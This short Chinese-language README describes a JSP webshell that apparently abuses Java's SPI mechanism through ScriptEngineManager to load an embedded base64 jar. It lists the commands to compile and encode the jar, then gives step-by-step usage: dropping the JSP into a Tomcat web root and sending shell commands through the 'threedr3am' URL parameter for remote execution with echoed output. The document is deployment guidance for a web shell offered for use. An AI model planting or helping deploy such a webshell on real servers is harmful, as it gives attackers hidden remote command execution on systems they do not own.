### SPI机制的ScriptEngineManager自动加载实例化JSP Webshell

编译SPI jar：
```
javac Threedr3amScript.java

jar -cvf threedr3am.jar META-INF Threedr3amScript.class

cat threedr3am.jar|base64
```

使用：
```
ps:若要修改jar逻辑，修改后按照上面编译的方式得到base64 jar数据替换jsp文件中的base64数据

1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问10.jsp，并使用参数threedr3am传入需要远程执行的命令，例：http://127.0.0.1:8080/10.jsp?threedr3am=whoami

3.服务器将会执行相应的shell命令，最后回显
```